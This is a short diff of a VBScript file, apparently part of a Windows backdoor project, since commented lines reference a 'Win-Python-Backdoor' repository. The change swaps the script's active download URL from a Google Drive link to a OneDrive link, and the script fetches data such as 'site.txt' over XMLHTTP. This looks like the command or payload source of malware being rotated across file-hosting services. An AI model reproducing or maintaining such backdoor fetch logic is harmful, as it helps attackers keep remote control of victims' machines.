@@ -3,7 +3,8 @@ set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
 dim url,mac
   'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
   'url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
-  url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
+  'url="https://drive.google.com/uc?export=download&id=1z1JvjIRzQvG3Hh_euyD6qPaictdMRkny"
+  url="https://onedrive.live.com/download.aspx?cid=7C80BDF021F1D245&authKey=%21AK7fmy%5FJWYJYexo&resid=7C80BDF021F1D245%213188&ithint=%2Etxt"
 'msgbox  url&"site.txt"
 'xmlhttp.open "get", url&"site.txt", false
 
